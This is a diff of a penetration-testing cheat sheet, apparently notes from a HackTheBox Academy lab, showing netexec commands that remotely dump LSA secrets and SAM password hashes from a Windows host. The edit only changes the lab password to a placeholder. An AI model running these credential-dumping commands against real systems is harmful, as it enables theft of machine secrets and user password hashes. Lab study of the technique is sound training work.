@@ -202,10 +202,10 @@ uid:rid:lmhash:nthash
 ### Extracting SAM and LSA hashes Remotely using netexec
 ```shell
 # dump LSA  hashes remotely (machine-secrets)
-$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+$ netexec smb 10.129.42.198 --local-auth -u bob -pattacker-password! --lsa
 
 # dump SAM  hashes remotely (local-user-passwords)
-$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+$ netexec smb 10.129.42.198 --local-auth -u bob -pattacker-password! --sam
 ```
 <br>
 
